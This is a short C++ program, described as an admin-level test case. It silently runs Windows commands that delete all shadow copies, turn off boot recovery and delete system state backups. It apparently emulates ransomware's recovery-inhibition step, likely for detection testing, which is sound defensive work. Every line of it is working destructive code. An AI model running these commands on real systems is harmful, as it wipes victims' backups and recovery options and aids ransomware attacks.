// Author: Shaddy43
// This test-case needs admin privileges

#include <iostream>
#include <Windows.h>

std::string ConvertWCHARToString(const WCHAR* wcharStr);

int main()
{
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    DWORD exitCode;
    BOOL bSuccess;
    const WCHAR* commands[] = {
        L"C:\\Windows\\System32\\vssadmin.exe Delete Shadows /All /Quiet",
        L"C:\\Windows\\System32\\bcdedit.exe /set {default} recoveryenabled No",
        L"C:\\Windows\\System32\\bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
        L"C:\\Windows\\System32\\wbadmin DELETE SYSTEMSTATEBACKUP",
        L"C:\\Windows\\System32\\wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest",
        L"C:\\Windows\\System32\\wbem\\wmic.exe SHADOWCOPY /nointeractive"
    };

    for (int i = 0; i < 6; i++) {
        std::wstring str = commands[i];
        LPWSTR strPtr = &str[0];
        //std::string details_str(str.begin(), str.end());

        bSuccess = CreateProcessW(NULL, strPtr, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (!bSuccess) {
            std::cout << "Failed to execute command !!!" << std::endl;
            continue;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);
        GetExitCodeProcess(pi.hProcess, &exitCode);
        if (exitCode == 0) {
            std::cout << "Command executed successfully: " << ConvertWCHARToString(commands[i]) << std::endl;
        }
        else {
            std::cout << "Command executed with exit code: " << exitCode << " - " << ConvertWCHARToString(commands[i]) << std::endl;
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return 0;
}

std::string ConvertWCHARToString(const WCHAR* wcharStr) {
    // Calculate the required buffer size for the multi-byte string
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wcharStr, -1, NULL, 0, NULL, NULL);
    if (bufferSize == 0) {
        // Handle the error
        return "";
    }

    // Allocate a buffer for the multi-byte string
    std::string multiByteStr(bufferSize, 0);

    // Perform the conversion
    int result = WideCharToMultiByte(CP_UTF8, 0, wcharStr, -1, &multiByteStr[0], bufferSize, NULL, NULL);
    if (result == 0) {
        // Handle the error
        return "";
    }

    // Remove the null terminator added by WideCharToMultiByte
    multiByteStr.resize(bufferSize - 1);
    return multiByteStr;
}
